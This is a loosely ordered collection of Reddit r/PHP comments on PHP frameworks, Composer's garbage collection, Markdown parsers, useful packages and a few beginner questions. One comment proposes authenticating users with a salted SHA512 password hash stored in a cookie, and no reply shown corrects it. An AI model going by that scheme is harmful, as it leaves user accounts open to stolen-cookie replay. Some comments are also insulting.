I'd rather say it's waste of cycles ;) PBKDF2 with one iteration or something like HKDF would do perfectly for your usecase. You need to stretch only limited entropy material (like passwords), but 256 bits from urandom is anything but limited entropy. It's pretty much like one was about to drink Atlantic ocean versus one was about to drink 8000 Atlantic oceans, no difference in the succes rate ;)
That's harsh. You should really show some more appreciation for the effort someone puts in for free.
I've looked at AOP a few times, but I've never really liked it. It seems like this solves the same problems as an event dispatcher but relies on a ton of meta-programming and "magic" to get it done.
There is nothing wrong with **Harry Potter Code** ......
Why should I appreciate a shitty piece of software? Just because someone spent some "effort"?
That was my feeling as well. I looked into integrating some sort of AOP system into Laravel. It's kinda cool on first glance but I couldn't help feeling like it was just one huge magic hack around events.
Yes. With time their effort is going to be better. By bashing developers that wish to contribute you are only hurting the community in the long run.
I gave him constructive feedback in another thread. But now he is advertising his shitty software for other people to use. This is actively hurting the community.
I've used it for logging because I didn't like injecting a logger "EVERYWHERE". It worked really well for example if you had a base controller and wanted to log what was passed to a method, and what the return code was. Be careful though, it's tempting to solve other problems using the technique, but for me it always became a bad idea, because as others have stated it quickly turns into "where did that magic happen".
Agree. If anything im seeing far more acceptance of PHP in Enterprise software, and growing negativity around Java. 
same here :D
If you are Java enterprise developer, and have coded all your life on expensive middleware stacks from IBM, HP or Oracle, Java must be best solution right? Except these days, Open Source provides some better alternatives for key growth areas, like web businesses, big data, anlaytics. And many of these components have PHP APIs due to its popularity, or becuase they grew out of web business use-cases. 
Yep. I've been talking to some people about getting a PECL built up, then the league/markdown package will use that if available. Hoedown is a thing, but I'm not too confident in the quality. Either way one PECL will be available. Not my first rodeo. :)
Well, he's not advertising. He's just showing it. He doesn't say it's prodution ready or anything close to that
He made a website and a tutorial. For a supposed learning project... How is that not advertising?
Now it's slower :( Version b23a3cd: Memory usage: 9.6MB (peak: 10.13MB), time: 44.96s Version 9950802: Memory usage: 9.58MB (peak: 10.11MB), time: 47.29s
Oh, you were being serious! Okay. Sorry, the winky faces made me thought you were being playful. Your points are valid and I'll consider lowering them in the beta release. (A0-A2 are alpha, B0-BN are beta, and not sure what I'll call version 1.0 in the tag)
You are really doing good job. Keep it up. All the best.
Let's hope gc_disable doesn't become the norm for every newbie dev who wants to "make the app fast".
https://mobile.twitter.com/TomNomNom/status/195304317601849344/photos
I worked with an aop code base with close to 1M LOC for about 2 years. In the general sense, yes it can be a pain transitioning to the approach. Empty classes that 'do things' despite themselves because they extend an abstract that is cut point aware; Syntactical sugar, and magic everywhere. Much faith is required initially. However, I will say that it was an excellent approach for managing a multi tenant code base, that is sold 'ala carte'. New plugin? Just give them the aspect in config, and it appears. Without adding any code to the client implementation, besides a config declaration. This can greatly cut down on code base size, if youre not required to replicate a ton of code for each new client site deployment. It can become very meaningful with hundred of saas customers. 
Slim will be easier to start with. I personally use Laravel (built with Symfony components). Nothing wrong with Symfony, it's actually pretty nice, although the learning curve is a little steeper than more opinionated frameworks. 
That's great news if/when it happens - and saves duplicate work - "cmark" should always be on "reference" thus only a small wrapper within the PECL extension needs to be maintained... Would also be expected with so many eyes over it - the quality/performance of "cmark" will only improve over time. Adding it to the PHP core (at least not compiled in as default) I don't think should be a goal. A PECL extension is more than ideal IMHO...
did you see https://leanpub.com/laravel-testing-decoded? 
Author of [Parsedown](http://parsedown.org/) here. A couple of points: - The fact that [Parsedown](http://parsedown.org/) is fast doesn't mean it can't be compliant with the CommonMark spec. We like the spec and we are working on making Parsedown compliant with it. - The Reddit thread where "people were ripping parsedown apart" is about an alpha version of Parsedown. [The thread that discusses the 1.0 release](http://www.reddit.com/r/PHP/comments/25pbxp/parsedown_10_released_fast_and_extensible_parser/) seems more relevant.
Unfortunately not unless someone creates one for me.
Both good points. To the first, I don't believe I inferred "The fact that Parsedown is fast means it can't be compliant with the CommonMark spec." The concern is more that multiple implementations have said that they are uninterested in changing their code to follow CommonMark because that would involve BC breaks. In [this example](https://github.com/gettalong/kramdown/issues/185) where shit is genuinely broken, they will not even fix that one isolated case following CommonMark guidelines, because a) they dont care about CommonMark and b) it would be a BC break. Like having plain text list items was ever an intended result... Anyhoo, we're going to have our API and compliance as close to CommonMark as possible, which is not something I expect you to do overnight. I am keeping a close eye on the progress on your coebase ofc . As for the code style, I'm glad it improved. It's still not something I'd put money on scoring highly on Scrutinizer, but that is possibly not a goal for you. League stuff tries make it super easy to contribute to, and that means classical code cleanliness is goal for us. And yeah I remember trying to get Parsedown to come and play on the League a while ago. Code cleanliness was something I planned to discuss if it came over. :)
Definitely not core. And yes, having a PECL would of course mean that any "Multi-Flavored Markdown" can just say "install this PECL extension along with the libcmake library and use this basic driver for our library." The league implementation will be a little different as it should be portable. It will use the cmake PECL if there, and use a userland implementation if not. That means the average CMS can use it without asking their users to install a bunch of crap on the CLI. Some will JUST wrap the PECL, or they can rely on the league markdown package for all their CommonMark needs and be just as portable as ours is but with the flexibility of multiple drivers. Sounds good huh? :)
It's really only something that would have an impact (positive or negative) for long running processes, or applications that create a LOT of refs.
Thanks for the mention! 
Finished reading "Getting started with laravel" a month or two ago, I would not recommend that one. In the middle of reading Laravel Application Development Cookbook and it is much better. I would recommend that one out of your list, although haven't read any of the others yet. Daylerees books are great from what other developers at the local laravel user group tell me. (reading those next) Laracasts is also high recommend and 40% off now. I posted link to the discount on twitter. Hope that helps. 
Here is a little tip, just create a database table including a column "count"; and increment in on every click.
Cute, but unhelpful.
Bro do you even HYPE -- you forgots Cakeigniteraravelphonyzend Framework. clearly the best thing since I invented the internet. 
do you have a tutorial I could look at?
I appreciate the response.
[Can't use this excuse anymore...](http://i.imgur.com/UKrGse7.jpg)
Are you not familiar with databases? Because I don't think that any one tutorial would help you here if you're not.
Apache is a web server that is popularly used with PHP. That bit doesn't seem too out of date! However you'll find the language constructs and the database libraries are old compared to current standards. Don't reject all online tutorials - there's some good ones out there. (Though I am biased, I'm an author!). 
I have used it on a few projects. It works well for me. In **/.htaccess:** #Sass Parser: anything /css/FILENAME.css -&gt; FILENAME.scss RewriteRule ^css/(.*).css?$ style.php/$1.scss [NC,L] In root folder, I have style.php: &lt;?php require "lib/scssphp/scss.inc.php"; $scss = new scssc(); $scss-&gt;setFormatter("scss_formatter"); $server = new scss_server("ui", null, $scss); $server-&gt;serve(); ?&gt; In my HTML, I use: &lt;link rel="stylesheet" href="/css/style.css"&gt; In /ui I have my file of actual SCSS code: **/ui/style.scss** And everything just works. SCSSPHP just checks if the file needs to be recompiled and does it transparently, otherwise sends the cached version.
There's already talk in an issue of bringing it back in a controlled way to limit memory spikes https://github.com/composer/composer/issues/3488 
 echo timeElapsedFilter(new DateTime('-30 days')); //1 month ago echo timeElapsedFilter(new DateTime('-20 days')); //2 weeks ago echo timeElapsedFilter(new DateTime('-10 days')); //1 week ago echo timeElapsedFilter(new DateTime('-1 days')); //1 day ago echo timeElapsedFilter(new DateTime('-5 hours')); //5 hours ago echo timeElapsedFilter(new DateTime('-150 minutes')); //2 hours ago echo timeElapsedFilter(new DateTime('-150 minutes'), true); //2 hours, 30 minutes ago
This is a user defined style based on our mixins/scss. I'm trying to reuse the part we do builds with to allow for dynamic variants. A build step is not appropriate here and we already do this for our part of the app.
Not sure why you got downvoted on that - I 110% agree Phil. 
I read your "constructive feedback". And are you even aware what all he fixed, how much this piece of software has improved ? What all do you think is wrong with this ? Stop acting like a Dick all the time. If you cant appreciate and help, don't keep farting. Improve yourself dude.
https://github.com/composer/composer/commit/ac676f47f7bbc619678a29deae097b6b0710b799
The examples given in the article could all quite simply be solved using Decorators - it's not clear what this Reflection magic is helping with.
almost no difference on memory usage, only time for the gc_disable() commit. 
What is the preferred method for handling user sessions? I'm trying to write a user handling method for dealing with logins however I'm having a bugger of a time trying to figure out the logistics. The idea I've come up with so far is this: - Each page calls user.php via include. - user.php checks for username set in cookie. - If no username set in cookie, then show login box and exit (prevents all other entry pages from working if no username is set). - If username is set, then get password from cookie. Password is the SHA512+Salt of the password provided at login. - Compare username and password with that stored in database. - If username and password match (authenticated), then rest of page is displayed. - If username and password do not match database, or username returns 0 results (not registered), then display login error, redirect to login page. The login page will contain a username and a password field, however the password is never set in the cookie, it is instead SHA512+salt hashed and stored in the database, then that value is stored in the user session cookie. The result is that the stored session never contains the user's real password, only it's salted SHA512 hash. Comments?
/u/nsnihalsahu why did you make this? how did it take you 6 hours to upload this to youtube?
yeah, but that focuses mostly on PHP testing via laravel, and its written by the same guy who manages and runs Laracasts, Jeffery Way. So yeah. point still stands. 
Slim isn't really much of a framework, it's more of a router with bonus features - but it is *great* for simple projects.
No worries. That is called a heredoc - here is a link that explains it: http://www.tuxradar.com/practicalphp/2/6/3 Basically instead of saying $str = "aaaaa" . "bbbbb" . "ccccc" we can say: $str = &lt;&lt;&lt;END_OF_STRING aaaaa bbbbb cccccc END_OF_STRING; The result is the same but the second one is (arguably) easier to read when we are putting together SQL selects. Note the word "END_OF_STRING" can be any combination of characters such as EOF, or EOL, or END. 
Yes, they are trivial cases but there're cases in which a decorator is a bit of an heavy solution.
That looks very useful, thanks! That looks like a great summary. He's right, Google doens't help much returning results of php advice from many years ago. There is a lot that seems happening lately and I have been off the wagon a little bit, with coding standards, .. and Composer.. good stuff!
So does this mean it is going to be an even bigger memory hog than before? The amount of memory needed to update laravel is extraordinary. 
I like it. My first thoughts now when I see bash scripts are to check them with www.shellcheck.net. There's also a way to have this run as part of Vagrant's provisioning: https://docs.vagrantup.com/v2/provisioning/shell.html 
There was actually another PR merged today which improved memory usage which was unrelated to this issue. I'm seeing 5-15% memory reductions with the latest version.
According to the comments on the [pull request](https://github.com/composer/composer/pull/3482), most people aren't seeing much of a change in memory usage (some a few MB down, some a few MB up, but % wise it's not much from what I was seeing).
Its because determining whether or not a circular reference can be garbage collected isnt easy to do: http://derickrethans.nl/collecting-garbage-performance-considerations.html
So this is how I'd do it. User submits form, the data posted would go into a html page and then use this to covert it into a pdf: https://github.com/dompdf/dompdf Then the produced pdf could be mailed to you. If you wanted me to build you an example, let me know, however this should give you a basis to work from.
Nope. See [schmittjoh's comments](https://github.com/composer/composer/pull/3482) on the PR - basically the GC was kicking in continuously despite not actually being able to clean anything up, due to (a) Composer's situation of just needing a huge dependency graph in memory, and (b) PHP's GC having a hard limit of how many objects it can track, which Composer often exceeded.
The services or vagrant files mentioned in the repo are already been used. Feel confident to provide insight or recommendations of others configurations. But please recommend boxes that already were used by you or your dev team.
I wonder if that dependency tree will ever need to move to disk? Memory usage grows exponentially, and it has to blow everyone's memory and swap eventually. 
Seeing the PRs that went through today, I imagine there's still huge room left for optimisation. I don't think building dependency trees is something that inherently should require silly amounts of memory.
Thanks a lot! Looks like the same thing.
Wow, all these downvotes and nobody's asking you what you've tried...
&gt; We like the spec and we are working on making Parsedown compliant with it. That's awesome to hear!
Yeah, this is definitely a backdoor. Let me guess... site is Wordpress? If so... that's the answer to how they put it up.
Never trust javascript code. Javascript validation is done as a convenience to save the users time. Always re-validate using server side code. But, for the second part. &lt;form name="hogan" method="post" onsubmit="return validateCreate();"&gt; &lt;script type="text/javascript"&gt; function validateCreate() { if(something_is_bad_you_do_your_checks_here){ return false; } return true; } &lt;/script&gt; 
While not specifically a PHP thing, a lot of these thoughts arise as part of writing PHP code. I'd love to discuss the topics I've outlined here as I am honestly not sure what to think. It'd be great to hear others thoughts and experiences on the matter.
I think i understand the dompdf to a point, but I am not sure how after rendering it I would submit it to an email.
I don't know, in the environment php is typically used in (short scripts that run for less than a second, clearing the whole memory space afterwards), GC probably does more bad than good. It only really makes sense in long running scripts (like import scripts), and apparently even that's questionable too.
You can try turning in general query logging for your DB and doing some data processing on that to build your graph. 
If your setup depends heavily on [Puphpet](https://puphpet.com/) I believe that the best way to share the configuration is through the puphpet/config.yaml file. Then you can drag/drop it into puphpet.com and it'll generate another .zip for you with the same settings.
Hard to say for sure, but instinctively I'd leave it on for long running processes (daemons and the like, not big web requests) and turn it off for shorter ones unless you have an extremely good handle on how your process is using its memory. That is to say circular references and other crap the GC should deal with are more likely to be harmful in processes that run indefinitely.
Hey they might be appreciative if you posted your project &amp; system details to [the github thread](https://github.com/composer/composer/pull/3482), or submitted a bug report.
I really need to learn Composer to work with the Spotify API. Anyone have a good starting point?
You should always care about security. If your assignment says not to care about it, your assignment is wrong. In the real world, shit gets hacked because people don't care about security. At any rate, /u/AceBacker's solution is the simplest and most straight forward. If you're allowed to use jQuery, you can intercept the form submit and prevent it's default action, and handle it from there.
"couldn't care less"
It's a simple table to hold one row that keeps an integer that increments every time your download link is clicked. Do some php/sql tutorials online. It's not that hard. You can make a table with 3 columns (Id, url, count) and track multiple link clicks.
I really like [intervention/image](https://packagist.org/packages/intervention/image) for making handling of image files completely painless
I think it's trying to communicate....
https://packagist.org/search/?q=Spotify
the extra garbage collection only applies to circular references. as long as they don't use those they're fine.
[Ardent Self Validating Models](https://packagist.org/packages/laravelbook/ardent) are great ... laravelbook/ardent is the composer package/name. Edit: Thanks everyone! I'm getting the impression that I should steer clear of Ardent ... I wasn't sure about the extra stuff (auto-hydrating) it was doing, but the amount of magic listed below does smell bad. 
Ummm they are totally different? Proactivity = Fixing/improving/refactoring etc Scope creep: &gt; "Oh and the client wants one more small feature X; should be easy right? Oh and you don't get extra time."
The [League of Extraordinary Packages](http://thephpleague.com/) has a ton of useful stuff, I especially like and often use: * [Factory Muffin](http://factory-muffin.thephpleague.com/) (Packagist: [league/factory-muffin](https://packagist.org/packages/league/factory-muffin)) * [Flysystem](http://flysystem.thephpleague.com/) (Packagist: [league/flysystem](https://packagist.org/packages/league/flysystem)) * [Fractal](http://fractal.thephpleague.com/) (Packagist: [league/fractal](https://packagist.org/packages/league/fractal)) * OAuth 2 [Server](http://oauth2.thephpleague.com/) and [Client](https://github.com/thephpleague/oauth2-client) (Packagist: [league/oauth2-server](https://packagist.org/packages/league/oauth2-server) and [league/oauth2-client](https://packagist.org/packages/league/oauth2-client)) Can you tell I've been doing a lot of API stuff lately? :) If you use Laravel, the [Laravel IDE helper](https://packagist.org/packages/barryvdh/laravel-ide-helper) and [Laravel Generators](https://packagist.org/packages/way/generators) are life savers in my opinion.
Starred this, I'll definitely need it sometime later. Thanks!
Honestly..... I dont remember. I don't think it was a drop in replacement. I don't even remember what issues i was having, and leafo may have been upgraded by then. I need to take a look at the two again and figure out which is best. I guess i was really just offering another option :)
https://github.com/ziadoz/awesome-php
How about you team up with Jordi, add the features to Toran and sell Repobox as a hosted/managed Toran? Also, do you have plans to pipe anything back into composer, "give back" as they say? 
Nice! bookmarked it
&gt; no arbitrary 3rd party annotation syntax Neither does the bundle you linked to. &gt; no nasty convoluted YAML config That is just the Symfony service definitions. If you're doing it right, you're going to have to write it anyway. &gt; How can anyone honestly sit there and go: "Hey, I need to add logging to my application. Let me do this" Of course you shouldn't do that! &gt; I don't understand why you can't just fire an event Because you would have to write a decorator for each and every class that you want to log or you need to inject the logger into the class which means that you have more dependencies for your class. Aspect-Oriented-Programming has it's place, but it's one of those things that should be used with caution (as stated in the article).
only certain components in laravel, that is why Laravel looses to Yii in terms of security
Learnt some new tips from this, thanks for writing it.
You can host multiple websites on the same server, but you need to understand how to isolate them from each other. 
Symfony is an incredibly well built framework, but it does indeed have a steep learning curve. In a professional environment, it's really amazing to work with.
Go ahead and read this: http://blog.codinghorror.com/what-if-we-could-weaponize-empathy/
Self validating models are a spectacularly bad idea. For tiny or small projects it may be ok, but for anything of medium complexity it becomes unwieldy. Separation of concerns.
[fzaninotto/Faker](https://github.com/fzaninotto/Faker) : awesome for generating quick seeds on an app, and quite fun to work with as well. 
http://i.imgur.com/0hQyd5L.gif
My favorite is [robmorgan/phinx](https://packagist.org/packages/robmorgan/phinx). It's database migrations done right. It's framework and database independent, it's incredibly fast, and it just works. I previously used Doctrine Migrations but it was eventually broken and I'm not sure if they ever got around to rewriting it. One big problem with Doctrine Migrations is that files and classes were just named Version&lt;timestamp&gt;.php so it was impossible to quickly scan a directory and see what file you needed to open. Phinx names them as &lt;timestamp&gt;_&lt;description&gt;.php like 20140324150826_create_password_reset_request_table.php. If you need to alter a migration or see the code in it, it makes it much easier to do so.
This is constructive: ***People really should follow the rule of least surprise when designing new tools.*** Even if PHP constantly fails to follow that rule and is a horrible language because of it, doesn't mean you should pile more such bad design on top.
Yeah image management across hosts can be a pain to write, we have imagick but its not available on all platforms so have to resort yo GD. So a library that can abstract this while having features is something I can really use, I do a lot of image manipulation stuff.
http://i.imgur.com/CPJWpIc.jpg
To use a phrase a friend of mine recently coined, Wordpress is a bucket of poo with wee on it.
The fact that he used wee and poo in place of shit and piss brings me to wonder how old your friend is, and if he's 5, how hes so wise so young
I don't dislike self-validating models, but I really don't recommend Ardent. Ardent basically consists of a single class with massive violations of SRP and relies on way, way too much magic. Auto-hydrating inputs, automatic purging of *_confirmation fields, redefining relationship syntax, it's just way, way too much.
She, actually. And I believe she's in her early 20s.
I used it a little while ago, version 1.2/1.3. It was fast, and it was pretty simple, however, I felt like their online docs didn't match up with their coding style for example projects on GitHub. As an example, their docs page was using a PHP array for config options, but [Vokuro](https://github.com/phalcon/vokuro/), one of their example apps, was using a .ini file for config options. It was really confusing because there wan't much consistency and it felt like the index.php file should have had a lot of stuff abstracted out but instead was being using as a dumping ground for a lot of their DI lifting. I'm guessing they've since updated things, but be warned that the learning curve will be a little steeper.
Run away! My last employer, who used to code but hadn't coded in years, tried to make this decision for one of our teams talking about how much faster it was and how we should use it for this one client. The team muddled around with it for about a week till I talked to the team lead and told him just to go tell the boss it wasn't working out. The documentation is terrible and the community is non-existent. Go with Laravel (which is what that team ended up going with). You will be much happier and be using a framework that has a great community, excellent docs, and active development. 
That looks quite nice. Pretty similar to [Imagine](https://imagine.readthedocs.org/en/latest/) which is also awesome.
&gt; Neither does the bundle you linked to. The link I provided is *littered* with non-PHP pseudo-syntax/language: &gt; Because you would have to write a decorator for each and every class that you want to log If you're firing an event for meaningful actions you want to log, you just register a listener that happens to be a logger, or an email dispatcher, or X, or Y, or whatever you want. Your class never has to grow beyond this: $this-&gt;event-&gt;fire('did.something', $DTO);
&gt; The link I provided is littered with non-PHP pseudo-syntax/language: Yes. These annotations are optional and have nothing to do with AOP. They come from the JMSDiExtraBundle and are used to define services. They are not necessary for the JMSAopBundle. &gt; If you're firing an event for meaningful actions you want to log, you just register a listener that happens to be a logger, or an email dispatcher, or X, or Y, or whatever you want. The crux is the word _your_. We don't have total control over our dependencies. Some services _do not_ fire events. We, as developers, have to work around these issues and AOP is _one of_ the methods to do that. There are other ways (such as decorators) but there are other ways too!
its awesome if you know what to do with it, its a good decision for high traffic rest apis etc, esp. for complicated data conversion/parsing etc projects that are huge in code BUT: If you want to make complete websites/portals i'd also say: go with laravel, as the time to market is much better, because of much much more community support
You mean Busines Intelligence? Like ICCube, Jasperreports etc? 
~~I really like it as well, but I'm still waiting for its [online documentation page](http://image.intervention.io/) to be up.~~ * It's me.
Sorry for being boring, but does components count? I would say Symfony components. They're all very useful, wonderfully written, and a treasure trove of knowledge if you were to explore its source code. At least one of them always have a place in every project I do. Also for log in. [Sentinel](https://cartalyst.com/manual/sentinel/1.0)
Right, but used by &gt; 60% of all cms driven websites :D http://w3techs.com/technologies/overview/content_management/all
Honestly using PHPUnit is a no brainer. Download the phar, done.
Modified dates can be faked, and shouldn't be counted on to identify when a file was compromised. If backups are available, I'd suggest checking a few to see if the date/time of compromise can be identified.
This. As others have said, well done to the guy for sticking with it and taking advice, but I can't be the only one getting sick of hearing Eaglehorn. All that he's doing now is shamelessly plugging his framework which many people have told him is pants. How come people on this subreddit get slated for posting their own packages which are well built but don't bring anything new to the table, yet this guy just keeps getting pats on the back?
I've had really bad experience with Ardent. If it was just a trait that you can include, I guess it would be fine... but it's so much more. You can define validation rules, relationship, model hooks.. it does just too much. I remember upgrading Laravel from 4 to 4.1 and they took ~28 days to merge a request that would fix it. There was multiple merge request from different people. My advice: stay away from it. 
No, it shouldn't. Laravel's models relate classes to a db table. That is all it *should* do.
Yes, its a really badly written piece of code. It also fails to make use of model events, which would clean up the code 100x. (not that I advocate self-validating models anyway)
Documentation isn't so great as stated below. Because of this, developers at least need to be solid junior to senior with already MVC background experience to have potential use of the Framework. Speed wise it is indeed insanely fast and quite light weight. It's very modular so you can only (and have to run) from the bootstrapper what is necessary, and I love that. It's still a new framework so don't expect such a developed community from it like Laravel and others. It does contain a config parser, routes, views (with templating call blade that is quite similar to Laravels), ACL, Validation and filters, and Caching along other things. I use it for one my startup projects and I love it. I find it easy to use once you learn all the basic building blocks it takes to create a project.
Similar to what /u/Cyzzie said, you are looking for some business intelligence tools. I would start at the beginning and read a book like http://www.amazon.com/Data-Science-Business-data-analytic-thinking/dp/1449361323/ref=sr_1_2?ie=UTF8&amp;qid=1417617015&amp;sr=8-2&amp;keywords=big+data+business+intelligence to get an idea of the concepts behind business intelligence, and then look into tools like Pentaho or Hadoop.
I fucking hate that I fucking love Wordpress. Fuck yeah. Wordpress rocks.
We have API, tracking scripts and such in Phalcon, runs great.
\* ... and you'll need to fix the security hole that resulted in the compromise, too (most likely the attacker has automated means for exploiting the application, and will quickly reclaim control if the original problem isn't fixed).
I actually didn't write it, just found it. Glad it was useful!
General consensus is that PHP 7 and HHVM is such a large change that it is incompatible with Phalcon, unless the devs actually say they are going to port it. Once PHP7 is released, it will be ~30% faster anyway. Why build on an incompatible runtime?
Wordpress is the windows of cms
Just read the excellent exposition of GC in PHP: http://blog.ircmaxell.com/2014/12/what-about-garbage.html For the reasons stated therein, it is probably (like 99% of the time) better to unset variables yourself, in a long-running script, than disable GC.
HA HA HA HA HA. GREED. SO MUCH GREED. A guy wrote an amazing package, gave away the code for free, built an amazingly helpful website around it with detailed excellent documentation, and charges $9 for something you don't have to pay for but can really help you out. BOY HE SURE IS GREEDY. Edit: of course he deletes his post.
They lost me when they decided the new version would be based on a custom language C-PHP hybrid, not C supposedly because their team was too small and they [couldn't find C developers to contribute](http://blog.phalconphp.com/post/57161129440/phalcon-2-0-the-future). 
I never suugested disabling it. Just running it at fixed periods, not letting it run automatically.
This was an absolutely fantastic post. Not only was it informative, but it gave considerations for how someone who doesn't know this would want to learn. Didn't cover too much all at once, used visual aids when necessary. 10/10.
Symfony Components and Packages ... is that an actual distinction? But anyway, *which* component would you recommend?
Did you check [the docs page](http://docs.phinx.org/en/latest/)?? Seems to be a great place to start.
&gt; General consensus is that PHP 7 and HHVM is such a large change that it is incompatible with Phalcon Sources? And if it is true (which I don't doubt), it's not going to be that much difficult to port than any other third party extension- except that it has a larger code base than most. Besides that, most companies who rely on PHP for their business are going to upgrade to a new major version release right away. But it would be nice if the Phalcon team **would make a public statement** regarding the future of Phalcon + PHP7.
Hehe - cute, but would never use it :)
you're right. It needs more unit tests before it's production ready.
Hey Guys, I really appreciate the mention. I've worked so hard on this project the last few years and I definitely think it was the right decision to open-source so the community could benefit from it. Not to mention the community was really responsible for also taking it to the next level! Now on the topic of greed - This is a project I have spent thousands of hours of my free time on. I also made the effort to write documentation and give that away for free as well: http://docs.phinx.org, hire a designer to create the public facing website and also write blog posts on this topic. See http://robmorgan.id.au. Whilst the screencast is only 15 minutes it also took me many weekends to script, develop the demo application and record it. I know its expensive but I deliberately priced it that way. I personally contact every person who actually buys it (of which there are very very few) and have received great feedback. The reason I did it was because alot of people requested it. If I'm able to buy a few beers out of it then I say without any guilt that I deserve it. Regards, Rob
Well, here's one for HHVM / Phalcon: http://forum.phalconphp.com/discussion/1353/hhvm I agree it wouldn't be impossible to port Phalcon to PHP7 / NG, but they're talking about rather large changes to the Zend engine for PHP 7. I'd love to see Phalcons own take on it before committing it to any projects I want to keep updating in the next couple of years. 
Do you have any experience with DB migration tools for multiple databases? I work on a project where the tables are sharded across multiple MySQL databases on multiple servers, and it seems most of the migration tools out there assume all of your tables are in the same database on the same host. We already have code that figures out which database and server a table is on. What I really need is the ability to define a function which accepts the table name and environment and allows me to return a full DB driver config, but I don't know of any tools that give that much flexibility. Are there any I've overlooked, or will I have to alter an existing tool?
Question - I seem to remember him getting banned from posting his own stuff to r/PHP. Is that correct or did I dream that? edit: I know that you're not him. His nick is ircmaxell and I referred to "him" and "his stuff" and not "you" and "your stuff". I was just asking a question, because he used to post a ton of stuff on here a few years back, and then I remember something about him being banned for posting too much stuff on here. And then it turns out he's an authoritative voice in the PHP community so now everybody else posts his stuff on here. Just asking.
What's the advantage of this approach ? I'm not sure about mixing control flow and exceptions, something feels wrong about it.
sometimes using if is too fast and leads to code that is much too readable.
wat. obvious [troll](http://i.imgur.com/znDx4Ro.png)
Why not core? I think Markdown is so common nowadays that having native PHP functions would be very useful. We have json_encode, CSV functions and more already.
I know this is not the thread to start a discussion, but what is a better alternative (independent of Laravel)? I have written and rewritten a small ORM system multiple times, all the models did was checking the datatype against the schema and doing basic validation (length, regexp...) in the setters (throwing standardized Exceptions on errors). My controllers/presenters set values in multiple places, so verifying on that level leads to a lot of duplicated code. Sending everything through a validation service adds a lot of vertical complexity, and letting the actual persistence component doing the checks is not correct (and too late) - what is a better approach?
Wouldn't the issue with the composer be pretty clear if you ran it through a profiler? Wouldn't it show too many calls to the gc routine?
From your article: "Basically we are enabling garbage collection, running it once and disabling it again".
We just talked this over and found that the description of the cycle collection is inaccurate in one point: After the cycle collector runs the root buffer will always be empty (not counting roots added while running object destructors), regardless of whether or not anything was actually destroyed. So the issue with composer is not that it runs the GC again and again on every delref. It will continue to run only every 10k root additions. The problem is likely that these 10k roots link to a really huge object graph (say one million objects) and traversing that, even if it happens relatively rarely, will be very slow.
You could set up different environments with Phinx to point to your different databases: http://docs.phinx.org/en/latest/configuration.html#environments
yes, but its done in a loop. so it gets enabled again and does this thing. Enabling garbage collection is basically allowing a sort of "cronjob" run in parallel looking and getting rid of garbage. My suggestion is to turn this cron on and off so that you control when its being ran. So baiscally instea dof running it 100 times you would just run it once. Sure it would have more to do in that single run compared to 100 smaller ones, but it has a much lower impact than running it too frquently.
There are three different configuration reader adapters; JSON, native and INI. Its not that difficult to figure that part out really. [edit] Additionally there is a YAML reader, but I don't find it that useful because it is in the [Phalcon Incubator](https://github.com/phalcon/incubator) as PHP code. This means that I can't easily use it to load my YAML based configuration that stores paths like where to find composer vendor, paths to setup the Phalcon autoloader, etc. Fortunately I just used \Phalcon\Config with yaml_parse_file() and I can get it all done in a single line of code. Certainly after Phalcon 2.0 hits then many of these very core and useful Incubator PHP based classes will be merged into the Phalcon 2 tree with Zephir.
This is a seriously awesome, easy package. Makes image upload security a lot easier since you can just re-save a temp file into a new location and strip out any nastiness.
It doesn't seem like environments are fine grained enough to help. I need to connect to one database to modify table A, but a different one to modify table B, both in the production environment. I could define two separate production environments, but I don't think I can switch between them on the fly for each migration.
Works fine for me?
I understand exactly what you are trying to do. I just don't think it's a good idea, based on the advice of people far wiser than me.
thats interesting. Didn't know that. Source?
The error message tells you exactly how to fix it: &gt;You are required to use the date.timezone setting or the date_default_timezone_set() function.
Yes, I have set it in the php.ini file. I did not come directly here upon receiving the error. I SUSPECT that httpd is not reading php.ini. I get the same result with no php.ini.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Boolean satisfiability problem**](https://en.wikipedia.org/wiki/Boolean%20satisfiability%20problem): [](#sfw) --- &gt;In [computer science](https://en.wikipedia.org/wiki/Computer_science), the __Boolean Satisfiability Problem__ (sometimes called __Propositional Satisfiability Problem__ and abbreviated as __SATISFIABILITY__ or __SAT__) is the problem of determining if there exists an [interpretation](https://en.wikipedia.org/wiki/Interpretation_(logic\)) that [satisfies](https://en.wikipedia.org/wiki/Satisfiability) a given [Boolean](https://en.wikipedia.org/wiki/Boolean_logic) [formula](https://en.wikipedia.org/wiki/Formula_(mathematical_logic\)). In other words, it asks whether the variables of a given Boolean formula can be consistently replaced by the values TRUE or FALSE in such a way that the formula [evaluates to TRUE](https://en.wikipedia.org/wiki/Validity). If this is the case, the formula is called *satisfiable*. On the other hand, if no such assignment exists, the function expressed by the formula is [identically FALSE](https://en.wikipedia.org/wiki/Contradiction#Contradiction_in_formal_logic) for all possible variable assignments and the formula is *unsatisfiable*. For example, the formula "*a* AND NOT *b*" is satisfiable because one can find the values *a* = TRUE and *b* = FALSE, which make (*a* AND NOT *b*) = TRUE. In contrast, "*a* AND NOT *a*" is unsatisfiable. &gt;==== &gt;[**Image**](https://i.imgur.com/0T7oOwI.png) [^(i)](https://commons.wikimedia.org/wiki/File:Sat_reduced_to_Clique_from_Sipser.svg) --- ^Interesting: [^Cook–Levin ^theorem](https://en.wikipedia.org/wiki/Cook%E2%80%93Levin_theorem) ^| [^Karp's ^21 ^NP-complete ^problems](https://en.wikipedia.org/wiki/Karp%27s_21_NP-complete_problems) ^| [^Maximum ^satisfiability ^problem](https://en.wikipedia.org/wiki/Maximum_satisfiability_problem) ^| [^Chaff ^algorithm](https://en.wikipedia.org/wiki/Chaff_algorithm) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cmk2tfm) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cmk2tfm)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Did you restart your web server?
